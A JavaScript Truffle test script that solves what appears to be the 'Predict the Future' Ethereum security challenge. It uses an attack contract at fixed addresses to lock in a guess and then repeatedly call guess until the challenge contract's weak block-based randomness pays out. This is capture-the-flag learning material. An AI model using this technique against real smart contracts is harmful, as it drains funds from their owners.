const PredictTheFutureChallenge = artifacts.require('PredictTheFutureChallenge')
const AttackPredictFuture = artifacts.require('AttackPredictFuture')

contract('AttackPredictTheFuture', () => {
  it('solve the challenge', async () => {
    // const challenge = await PredictTheFutureChallenge.new({value: web3.toWei(1, 'ether')})
    // const atk = await AttackPredictFuture.new()
    const challenge = await PredictTheFutureChallenge.at('0xE23CBa5FEa83bB06Bf5dbaCB4A081DF1A0B54AE8')
    const atk = await AttackPredictFuture.at('0x07430aa71a645597c6fbeea678bfeb80736e8c1c')
    const guess = 0
    await atk.lockInGuess(challenge.address, guess, {value: web3.toWei(1, 'ether')})
    console.log('lock in guess complete, start withdraw')
    await atk.withdraw()
    console.log('withdraw done, start guess')
    var count = 0
    while (!await challenge.isComplete()) {
      count += 1
      console.log('Try again ' + count)
      await atk.guess(challenge.address, guess)
    }

    assert(await challenge.isComplete() === true)
  }).timeout(5000000000)
})
